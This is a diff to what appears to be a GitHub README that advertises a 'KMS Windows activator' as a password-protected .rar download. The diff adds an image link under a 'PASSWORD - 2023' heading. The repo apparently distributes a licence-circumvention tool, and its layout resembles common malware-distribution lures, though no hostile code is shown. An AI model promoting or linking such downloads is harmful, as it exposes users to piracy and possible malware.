@@ -22,5 +22,6 @@
 | v1.0.0 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/visualpromake/kms/releases/download/kms_windows_activator/KMSWinPasswd_2023.rar) |
 
 # <h1 align=center> ✅✅✅PASSWORD - 2023✅✅✅
+![](https://github.com/visualpromake/kms/assets/147176395/0f47cf80-e265-4372-a1e2-e729921d0b0e)
 
 # <h1 align=center> TURN ALL YOUR IDEAS INTO REALITY!
